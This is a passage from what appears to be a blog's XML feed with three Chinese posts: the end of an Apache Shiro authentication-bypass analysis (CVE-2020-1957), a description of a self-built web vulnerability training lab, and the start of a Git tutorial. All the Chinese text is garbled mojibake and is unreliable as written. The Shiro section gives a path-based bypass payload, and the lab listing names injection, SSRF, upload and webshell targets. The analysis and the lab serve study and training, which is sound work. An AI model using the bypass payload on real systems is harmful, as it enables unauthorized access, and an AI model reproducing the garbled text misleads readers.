<li>åˆ¤æ–­æ˜¯å¦åŒ¹é…æ‹¦æˆªå™¨ï¼ŒåŒ¹é…æˆåŠŸå°†ä¼šè¿”å›å“åº”çš„æ‹¦æˆªå™¨æ‰§è¡Œé“¾</li>
<li>è®©ShiroFitheræ‰§è¡Œæƒé™æ“ä½œçš„</li>
</ul>
</li>
<li><p>pathMatcheså‡½æ•°å…¶æœ€ç»ˆä¼šè°ƒç”¨shiro.util.AntPathMatcherç±»ä¸­doMatchçš„å¯¹äºantæ ¼å¼çš„pathPatternå’ŒrequestURIè¿›è¡ŒåŒ¹é…</p>
<ul>
<li>doMatch:109, AntPathMatcher (org.apache.shiro.util)ï¼Œå½“Shiro çš„Antæ ¼å¼çš„pathPattern ä¸­çš„çš„<code>*</code>é€šé…ç¬¦æ˜¯ä¸æ”¯æŒåŒ¹é…è·¯å¾„çš„ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡æ‹¦æˆªå™¨ï¼Œç›´æ¥è®¿é—®åˆ°èµ„æº</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//pathMatches:135, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">protected boolean pathMatches(String pattern, String path) &#123;</span><br><span class="line">        PatternMatcher pathMatcher = this.getPathMatcher();</span><br><span class="line">        return pathMatcher.matches(pattern, path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡"><a href="#ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡" class="headerlink" title="ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡"></a>ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡</h5><ul>
<li>1.5.0ç‰ˆæœ¬ä¿®å¤<ul>
<li>ä»£ç ä¿®å¤ä½ç½®ä¸ºpathsMatch:125, PathMatchingFilter (org.apache.shiro.web.filter)ï¼Œè¯¥ä¿®å¤æ–¹å¼æ˜¯é€šè¿‡åˆ¤æ–­requestURIæ˜¯å¦ä»¥<code>/</code>ä¸ºç»“å°¾ï¼Œå¦‚æœä»¥<code>/</code>ç»“å°¾çš„è¯ï¼Œåˆ™å»æ‰å°¾éƒ¨çš„<code>/</code>ç¬¦å·åœ¨ä¸URLè¡¨è¾¾å¼è¿›è¡Œæ¯”è¾ƒ</li>
<li>å½“requestURIä¸º<code>/hello/1/</code>ç­‰ä»¥<code>/</code>ä¸ºç»“å°¾çš„URIçš„æ—¶å€™ï¼Œéƒ½ä¼šè¢«æ¸…é™¤æœ€åçš„<code>/</code>å·ï¼Œå†è¿›è¡ŒURLè·¯å¾„åŒ¹é…</li>
</ul>
</li>
<li>&lt; 1.5.1ç‰ˆæœ¬ç»•è¿‡<ul>
<li>payloadï¼š<code>/fdsf;/../hello/1</code></li>
<li>é—®é¢˜åŒæ ·æ˜¯åœ¨getChainå‡½æ•°ä¸­å¯¹äºrequestURIçš„è·å–ä¸­ï¼Œè·å–åˆ°çš„æ˜¯/fdsf</li>
<li>åœ¨RequestUriå‡½æ•°ä¸­æœ€ç»ˆè°ƒç”¨decodeAndCleanUriStringå‡½æ•°å¯¹URIè¿›è¡Œæ¸…æ´—</li>
<li>å¦‚æœURIä¸­å­˜åœ¨<code>;</code>å·çš„è¯ï¼Œåˆ™ä¼šåˆ é™¤å…¶åé¢çš„æ‰€æœ‰å­—ç¬¦ã€‚<code>/fdsf;/../hello/1/</code>æœ€ç»ˆä¹Ÿå°±å˜æˆäº†<code>/fdsf</code> ä»è€Œå¯¼è‡´äº†ç»•è¿‡</li>
</ul>
</li>
<li>1.5.2ç‰ˆæœ¬ä¿®å¤<ul>
<li>è·å–requestURIçš„æ–¹å¼ä»<code>request.getRequestUri</code>ç›´æ¥è·å–çš„æ–¹å¼æ›´æ”¹ä¸ºè·å–requestçš„ContextPathï¼ŒServletPathï¼ŒPathInfoï¼Œç„¶åå†é‡æ–°æ‹¼æ¥è€Œæˆ</li>
</ul>
</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="[https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/](https://blog.riskivy.com/shiro-æƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆcve-2020-1957ï¼‰/)">Shiro æƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆCVE-2020-1957ï¼‰</a></li>
<li><a href="https://blog.csdn.net/qq_43645782/article/details/106084263" target="_blank" rel="noopener">Apache Shiro æƒé™ç»•è¿‡æ¼æ´ ï¼ˆShiro-682ï¼‰å¤ç°</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>Web--Training v1.0</title>
    <url>/2020/07/12/web_training/</url>
    <content><![CDATA[<hr>
<h3 id="Webâ€“Training-v1-0"><a href="#Webâ€“Training-v1-0" class="headerlink" title="Webâ€“Training v1.0"></a>Webâ€“Training v1.0</h3><p>â­ é¶åœºé“¾æ¥ä¸ºåº¦ç›˜ï¼šé“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1I0oJLdVzjv0grHzlgITvLg" target="_blank" rel="noopener">https://pan.baidu.com/s/1I0oJLdVzjv0grHzlgITvLg</a> æå–ç ï¼šdcib</p>
<blockquote>
<p>   é¶åœºè¦ç‚¹ï¼š</p>
<ol>
<li><p>æœ¬é¶åœºä¸ºè‡ªæ­å»ºï¼Œç´ ææºç æ¥è‡ªäº’è”ç½‘ä»¥åŠè‡ªç¼–å†™ï¼Œè‹¥æœ‰ä¾µæƒï¼Œè”ç³»æˆ‘åˆ é™¤</p>
</li>
<li><p>æœ¬é¶åœºåªç”¨ä½œWebå®‰å…¨åˆå­¦è€…æ‰€ç”¨ï¼Œé¶åœºæ”¶é›†æ¥ä¹‹ä¸æ˜“ï¼Œä¸”ç”¨ä¸”çæƒœ</p>
</li>
<li><p>æœ¬é¶åœºä¸ç”¨åšä»»ä½•å•†ä¸šç”¨é€”ï¼Œåªä½œå­¦ä¹ äº¤æµ</p>
</li>
</ol>
</blockquote>
<ul>
<li>é¶åœºç³»ç»Ÿ<ul>
<li>Window Server 2003 Enterprise Edition Service Pack 2</li>
</ul>
</li>
<li>WebæœåŠ¡ï¼ˆç”±PHPstudyã€JSPstudyä»¥åŠè‡ªå®‰è£…ï¼‰<ul>
<li>php 5.3.29/5.3.29-nts/5.2.17</li>
<li>Apache 2.4.10</li>
<li>Nginx 1.6.2</li>
<li>MySQL 5.5.40</li>
<li>phpMyAdmin 3.5.8.2</li>
<li>OpenSSL 1.0.1e&amp;0.9.8y</li>
<li>JDK 1.7_51</li>
<li>Tomcat 6.0.44</li>
<li>IIS6.0</li>
<li>PostgreSQL 8.2</li>
<li>SQL Server 2005</li>
<li>Redis 2.6.8-pre2</li>
</ul>
</li>
<li>å¦å®‰è£…æ‰©å±•<ul>
<li>ISAPI_Rewrite3</li>
</ul>
</li>
<li>Web Application Firewall     <ul>
<li>SafeDogIISï¼ˆå®‰å…¨ç‹—ï¼‰V4.0</li>
<li>Dç›¾ v2.1.5.4</li>
<li>äº‘é” v3.1.18.5</li>
<li>libinjection-3.10.0ï¼ˆæœ‰å®‰è£…åŒ…ï¼Œæš‚æœªå®‰è£…ï¼‰</li>
<li>ModSecurityIIS_2.9.3-32b.msiï¼ˆæœ‰å®‰è£…åŒ…ï¼Œæš‚æœªå®‰è£…ï¼‰</li>
<li>SafeDogApacheï¼ˆå®‰å…¨ç‹—ï¼‰V4.0ï¼ˆæœ‰å®‰è£…åŒ…ï¼Œæš‚æœªå®‰è£…ï¼‰</li>
<li>ngx_lua_waf-0.7.2ï¼ˆæœ‰å®‰è£…åŒ…ï¼Œæš‚æœªå®‰è£…ï¼‰</li>
<li>PHPIDS-0.7ï¼ˆæœ‰å®‰è£…åŒ…ï¼Œæš‚æœªå®‰è£…ï¼‰</li>
</ul>
</li>
</ul>
<h3 id="é¶åœº"><a href="#é¶åœº" class="headerlink" title="é¶åœº"></a>é¶åœº</h3><h4 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h4><ul>
<li>æºç é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8001</td>
<td align="center">Accessæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8002</td>
<td align="center">Mssqlæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8003</td>
<td align="center">Mysqlæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8004</td>
<td align="center">Postgresqlæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8011</td>
<td align="center">Cookieæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8012</td>
<td align="center">ä¼ªé™æ€æ³¨å…¥</td>
<td align="center">éœ€è¦å¼€å¯ISAPI_Rewrite3é‡å†™æ‰©å±•</td>
</tr>
<tr>
<td align="center">8013</td>
<td align="center">Getæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8014</td>
<td align="center">Postæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8015</td>
<td align="center">äºŒé˜¶æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8016</td>
<td align="center">XFFæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8017</td>
<td align="center">XMLæ–‡ä»¶æ³¨å…¥</td>
<td align="center">åªæ˜¯æ–‡ä»¶å­˜å‚¨ï¼ŒéXXE</td>
</tr>
<tr>
<td align="center">8018</td>
<td align="center">Unionè”åˆæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8019</td>
<td align="center">æŠ¥é”™æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8020</td>
<td align="center">Booleanæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8021</td>
<td align="center">Base64æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8022</td>
<td align="center">æ—¶é—´æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8023</td>
<td align="center">å®½å­—èŠ‚æ³¨å…¥(Get)</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8024</td>
<td align="center">å †å æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8025</td>
<td align="center">Insertå‹æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8026</td>
<td align="center">Deleteå‹æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8027</td>
<td align="center">Updateå‹æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8028</td>
<td align="center">æœç´¢å‹æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8029</td>
<td align="center">å®½å­—èŠ‚æ³¨å…¥</td>
<td align="center">æœ‰æ³¨å…¥ç”¨ä»£ç widebytes-post.php/widebytes-post.py</td>
</tr>
<tr>
<td align="center">8030</td>
<td align="center">Order byæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8031</td>
<td align="center">Group byæ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8032</td>
<td align="center">äºŒæ¬¡ç¼–ç æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8033</td>
<td align="center">ä¸‡èƒ½å¯†é’¥-ç®€å•</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8034</td>
<td align="center">ä¸‡èƒ½å¯†é’¥-Uinon</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li>CMS/æ¯”èµ›é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8051</td>
<td align="center">Bluecms</td>
<td align="center">Httpå¤´æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8052</td>
<td align="center">74cms</td>
<td align="center">äºŒé˜¶æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8053</td>
<td align="center">Jeany</td>
<td align="center">æœç´¢å‹æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8054</td>
<td align="center">å—æ–¹æ•°æ®</td>
<td align="center">Cookieæ³¨å…¥</td>
</tr>
<tr>
<td align="center">8055</td>
<td align="center">Beecms</td>
<td align="center">åå°æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8056</td>
<td align="center">W78cms</td>
<td align="center">æœç´¢æ¡†æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8057</td>
<td align="center">Shop7z</td>
<td align="center">åç§»æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8058</td>
<td align="center">ä½›å±±å‘å‘é±¼</td>
<td align="center">åç§»æ³¨å…¥</td>
</tr>
<tr>
<td align="center">8059</td>
<td align="center">Phpcms_v9</td>
<td align="center">Authkeyæ³¨å…¥ï¼Œæœ‰æ³¨å…¥ç”¨ä»£ç phpv9 authkey.php</td>
</tr>
<tr>
<td align="center">8060</td>
<td align="center">Xycmså®¶åº­è£…ä¿®</td>
<td align="center">Accessæ³¨å…¥</td>
</tr>
<tr>
<td align="center">8061</td>
<td align="center">MetInfo v5.0</td>
<td align="center">Sqlæ³¨å…¥</td>
</tr>
<tr>
<td align="center">8062</td>
<td align="center">Xycmsæ¬å®¶</td>
<td align="center">Sqlæ³¨å…¥</td>
</tr>
<tr>
<td align="center">8063</td>
<td align="center">Xdcms</td>
<td align="center">Postæ³¨å…¥</td>
</tr>
<tr>
<td align="center">8064</td>
<td align="center">19å¹´å¼ºç½‘æ¯éšä¾¿æ³¨</td>
<td align="center">å †å æ³¨å…¥ï¼Œéœ€åˆå§‹åŒ–æ•°æ®åº“</td>
</tr>
</tbody></table>
<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><ul>
<li>æºç é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8101</td>
<td align="center">XXEæœ‰å›æ˜¾æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8102</td>
<td align="center">XXEæ— å›æ˜¾æœ‰æŠ¥é”™æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8103</td>
<td align="center">XXEæ— æŠ¥é”™æ— å›æ˜¾æ³¨å…¥</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8104</td>
<td align="center">Simplexml_load_string</td>
<td align="center">phpå‡½æ•°</td>
</tr>
<tr>
<td align="center">8105</td>
<td align="center">DOMDocument</td>
<td align="center">phpå‡½æ•°</td>
</tr>
<tr>
<td align="center">8106</td>
<td align="center">SimpleXMLElement</td>
<td align="center">phpå‡½æ•°</td>
</tr>
</tbody></table>
<ul>
<li>CMS/æ¯”èµ›é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8151</td>
<td align="center">S-CMSåŒ»é™¢å»ºç«™ç³»ç»Ÿv3.0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8152</td>
<td align="center">MetInfo-v6.0.0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8153</td>
<td align="center">Phpshe-v1.7</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><ul>
<li>æºç é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8201</td>
<td align="center">ssrfå…¨æµ‹è¯•</td>
<td align="center">å¤šç§åè®®çš„æµ‹è¯•ï¼Œdict/http/gopher/fileç­‰åè®®ï¼Œæµ‹è¯•æ—¶å¯å¼€å¯redis-server</td>
</tr>
<tr>
<td align="center">8202</td>
<td align="center">ssrfæ— å›æ˜¾</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8303</td>
<td align="center">ssrf-http(s)æµ‹è¯•</td>
<td align="center">æœ‰æ³¨å…¥ç”¨ä»£ç 301.php/302.php</td>
</tr>
<tr>
<td align="center">8204</td>
<td align="center">file-get-contents</td>
<td align="center">phpå‡½æ•°</td>
</tr>
<tr>
<td align="center">8205</td>
<td align="center">fsockopen</td>
<td align="center">phpå‡½æ•°</td>
</tr>
</tbody></table>
<ul>
<li>CMS/æ¯”èµ›é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8251</td>
<td align="center">Disccuz-x3.1</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><ul>
<li>æºç é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8301</td>
<td align="center">Nginxæ–‡ä»¶è§£ææ¼æ´</td>
<td align="center">éœ€å¼€å¯Nginx</td>
</tr>
<tr>
<td align="center">8302</td>
<td align="center">Apacheæ–‡ä»¶è§£ææ¼æ´</td>
<td align="center">éœ€å¼€å¯Apache</td>
</tr>
<tr>
<td align="center">8303</td>
<td align="center">IISæ–‡ä»¶è§£ææ¼æ´</td>
<td align="center">éœ€å¼€å¯IIS</td>
</tr>
<tr>
<td align="center">8304</td>
<td align="center">Uploadé¶åœºçš„é“¾æ¥ä¸è§£æ</td>
<td align="center">å»ºè®®ç©Upload-labsæ—¶è¾¹çœ‹æ­¤ç«¯å£çš„å†…å®¹</td>
</tr>
<tr>
<td align="center">8305</td>
<td align="center">è¡¨å•æ— æŒ‰é’®æäº¤</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8306</td>
<td align="center">ä¿®æ”¹ä¸Šä¼ ç›®å½•</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8307</td>
<td align="center">åŒæ–‡ä»¶ä¸Šä¼ </td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8308</td>
<td align="center">Fckeditorç¼–è¾‘å™¨ v2.4.3</td>
<td align="center">åŸºäºXycms</td>
</tr>
<tr>
<td align="center">8309</td>
<td align="center">Fckeditorç¼–è¾‘å™¨ v2.5</td>
<td align="center">åŸºäºXycms</td>
</tr>
<tr>
<td align="center">8310</td>
<td align="center">Fckeditorç¼–è¾‘å™¨ v2.6.3</td>
<td align="center">åŸºäºXycms</td>
</tr>
<tr>
<td align="center">8311</td>
<td align="center">EWEBç¼–è¾‘å™¨ v5.5</td>
<td align="center">åŸºäºXycmsï¼Œæœ‰æ³¨å…¥ç”¨ä»£ç eweb5.5.html</td>
</tr>
</tbody></table>
<ul>
<li>CMS/æ¯”èµ›é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8351</td>
<td align="center">dedecms v5.7 sp1</td>
<td align="center">ä¸Šä¼ ç›®å½•ä¿®æ”¹</td>
</tr>
<tr>
<td align="center">8352</td>
<td align="center">å—æ–¹æ•°æ®</td>
<td align="center">åŒæ–‡ä»¶ä¸Šä¼ </td>
</tr>
<tr>
<td align="center">8353</td>
<td align="center">å† é¾™ç§‘æŠ€ v6.0</td>
<td align="center">ç›®å½•éå†/ä¸Šä¼ </td>
</tr>
<tr>
<td align="center">8354</td>
<td align="center">W78ä¼ä¸šå»ºç«™ç³»ç»Ÿ</td>
<td align="center">åˆ©ç”¨expæ„é€ ä¸Šä¼ </td>
</tr>
</tbody></table>
<h4 id="phpç›¸å…³"><a href="#phpç›¸å…³" class="headerlink" title="phpç›¸å…³"></a>phpç›¸å…³</h4><ul>
<li>æºç é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8401</td>
<td align="center">phpç›¸å…³æµ‹è¯•</td>
<td align="center">æ–‡ä»¶åŒ…å«ã€PHPä¼ªåè®®ã€ä»£ç æ‰§è¡Œã€å˜é‡è¦†ç›–ã€ç›®å½•éå†ã€URLé‡å®šå‘</td>
</tr>
<tr>
<td align="center">8402</td>
<td align="center">__wakeup()</td>
<td align="center">phpååºåˆ—åŒ–wakeupå‡½æ•°çš„ç»•è¿‡</td>
</tr>
<tr>
<td align="center">8403</td>
<td align="center">php://input</td>
<td align="center">phpä¼ªåè®®</td>
</tr>
<tr>
<td align="center">8404</td>
<td align="center">php://filter</td>
<td align="center">phpä¼ªåè®®</td>
</tr>
</tbody></table>
<ul>
<li>CMS/æ¯”èµ›é¶åœº</li>
</ul>
<table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8451</td>
<td align="center">æ˜“åº“å½±è§†CMS</td>
<td align="center">æ–‡ä»¶åŒ…å«</td>
</tr>
<tr>
<td align="center">8452</td>
<td align="center">æµ·æ´‹CMS v6.28</td>
<td align="center">ä»£ç æ‰§è¡Œ</td>
</tr>
<tr>
<td align="center">8453</td>
<td align="center">dedecms v5.7</td>
<td align="center">å˜é‡è¦†ç›–</td>
</tr>
<tr>
<td align="center">8454</td>
<td align="center">20å¹´ç½‘é¼æ¯é’é¾™ç»„Areserialize</td>
<td align="center">phpååºåˆ—åŒ–</td>
</tr>
<tr>
<td align="center">8455</td>
<td align="center">buuojæå®¢å¤§æŒ‘æˆ˜2019PHP</td>
<td align="center">phpååºåˆ—åŒ–</td>
</tr>
</tbody></table>
<h4 id="é›†æˆé¶åœºä»¥åŠWebshell"><a href="#é›†æˆé¶åœºä»¥åŠWebshell" class="headerlink" title="é›†æˆé¶åœºä»¥åŠWebshell"></a>é›†æˆé¶åœºä»¥åŠWebshell</h4><table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">9001</td>
<td align="center">mssql-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9002</td>
<td align="center">sqli-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9003</td>
<td align="center">xxe-lab</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9004</td>
<td align="center">phpaudit-xxe</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9005</td>
<td align="center">xss-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9006</td>
<td align="center">upload-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9051</td>
<td align="center">WEBSHELLç®±å­ç®¡ç†ç³»ç»Ÿ V1.0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9052</td>
<td align="center">é­”ç¥WebShell</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h4><table>
<thead>
<tr>
<th align="center">ç«¯å£</th>
<th align="center">é¶åœº</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">88</td>
<td align="center">test</td>
<td align="center">Everyoneçš„Systemæƒé™</td>
</tr>
<tr>
<td align="center">89</td>
<td align="center">cgi-test</td>
<td align="center">Everyoneçš„Systemæƒé™ã€cgiæµ‹è¯•</td>
</tr>
<tr>
<td align="center">80</td>
<td align="center">é»˜è®¤ç½‘ç«™</td>
<td align="center">é˜²å†²çªåœæ­¢ä½¿ç”¨</td>
</tr>
</tbody></table>
<h3 id="å¾…è¡¥å……"><a href="#å¾…è¡¥å……" class="headerlink" title="å¾…è¡¥å……"></a>å¾…è¡¥å……</h3><h4 id="å¤§é¶åœº"><a href="#å¤§é¶åœº" class="headerlink" title="å¤§é¶åœº"></a>å¤§é¶åœº</h4><ul>
<li>XSS</li>
<li>CSRF</li>
<li>é€»è¾‘æ¼æ´</li>
<li>Getshellé¶åœº</li>
<li>JSPç›¸å…³æ¼æ´æµ‹è¯•ï¼šStuct2ã€Javaååºåˆ—åŒ–æ¼æ´ã€Tomcatéƒ¨ç½²æ¼æ´ã€WebLogicæ”»å‡»</li>
<li>â–² å„ç§é¶åœºçš„æ›´å¤šCMS</li>
<li>â–² å¯è¿›è¡Œæµ‹è¯•çš„CTFé¶åœº</li>
</ul>
]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
  </entry>
  <entry>
    <title>GitåŸºç¡€</title>
    <url>/2020/07/12/git_base/</url>
    <content><![CDATA[<hr>
<h2 id="GitåŸºç¡€"><a href="#GitåŸºç¡€" class="headerlink" title="GitåŸºç¡€"></a>GitåŸºç¡€</h2><ul>
<li>ä»€ä¹ˆæ˜¯Git<ul>
<li>Gitä¸­çš„æ•°æ®åº“</li>
</ul>
</li>
<li>Gitçš„åŸºæœ¬æ“ä½œ<ul>
<li>å®‰è£…Git</li>
<li>Gitçš„åŸºæœ¬å‘½ä»¤</li>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Gitçš„åˆ†æ”¯<ul>
<li>Gitåˆ†æ”¯æ“ä½œ</li>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Gitçš„åˆå¹¶<ul>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Gitçš„å›æ»šæ’¤é”€<ul>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>gitignore/forkåŒæ­¥<ul>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Gitçš„å…å¯†ä¼ é€<ul>
<li>Gitä¼ è¾“çš„åè®®</li>
<li>SSHåè®®ç™»é™†</li>
</ul>
</li>
<li>Gitçš„å·¥ä½œæµ</li>
<li>å¸¸ç”¨å·¥å…·</li>
</ul>
<h3 id="0X00-ä»€ä¹ˆæ˜¯Git"><a href="#0X00-ä»€ä¹ˆæ˜¯Git" class="headerlink" title="0X00 ä»€ä¹ˆæ˜¯Git"></a>0X00 ä»€ä¹ˆæ˜¯Git</h3><ul>
<li>åˆ†å¸ƒå¼ç‰ˆæœ¬ç®¡ç†ç³»ç»Ÿ<ul>
<li>æœ€åˆæ˜¯ä¸ºäº†ç®¡ç†Linuxçš„ç³»ç»Ÿå†…æ ¸</li>
<li>åŒFTPç›¸åŒçš„åŠŸèƒ½</li>
<li>éçº¿æ€§ç®¡æ–‡ä»¶</li>
<li>é€Ÿåº¦å¿«</li>
<li>å¯¹å¾…æ•°æ®æ›´åƒä¸€ä¸ªå¿«ç…§æµ</li>
<li>å¯ä»¥åœ¨æ— ç½‘ç»œçš„æƒ…å†µä¸‹è¿›è¡Œæäº¤åˆ°æœ¬åœ°æœåŠ¡å™¨ï¼Œåœ¨æœ‰ç½‘ç»œçš„æƒ…å†µä¸‹æäº¤ç»™è¿œç«¯çš„æœåŠ¡å™¨</li>
</ul>
</li>
</ul>
<p><img src="/images/git/1-Git-Server-and-Computer.PNG" alt="1-Git-Server and Computer"></p>
<ul>
<li>æ–¹å¼ï¼šç›´æ¥è®°å½•å¿«ç…§è€Œéæ–¹å¼ï¼Œæ¯æ¬¡ä¿®æ”¹éœ€è¦ä¸€æ¬¡Commit</li>
<li>ä¿è¯å®Œæ•´æ€§ï¼šè®¡ç®—æ ¡éªŒå’Œï¼ˆå“ˆå¸Œç®—æ³•ï¼‰ï¼ŒGitå­˜å–çš„æ˜¯å“ˆå¸Œå€¼</li>
</ul>
<p><img src="/images/git/1-Git--Snaphost.PNG" alt="1-Git--Snaphost"></p>
<p><img src="/images/git/1-Git--%E5%AE%8C%E6%95%B4%E6%80%A7.PNG" alt="1-Git--å®Œæ•´æ€§"></p>
<h5 id="Gitä¸­çš„æ•°æ®åº“"><a href="#Gitä¸­çš„æ•°æ®åº“" class="headerlink" title="Gitä¸­çš„æ•°æ®åº“"></a>Gitä¸­çš„æ•°æ®åº“</h5><ul>
<li>Gitä»“åº“â€“.git directoryï¼šä¿å­˜é¡¹ç›®æ•°æ®ï¼Œå…ƒæ•°æ®çš„åœ°æ–¹ï¼Œgitè‡ªå·±ç»´æŠ¤çš„æ–‡ä»¶å¤¹</li>
<li>å·¥ä½œç›®å½•â€“Working Directoryï¼šå†…å®¹è‡ªGitä»“åº“ï¼Œå¯¹å½“å‰é¡¹ç›®æŸä¸€ç‰ˆæœ¬ç‹¬ç«‹æå–å‡ºæ¥çš„å†…å®¹</li>
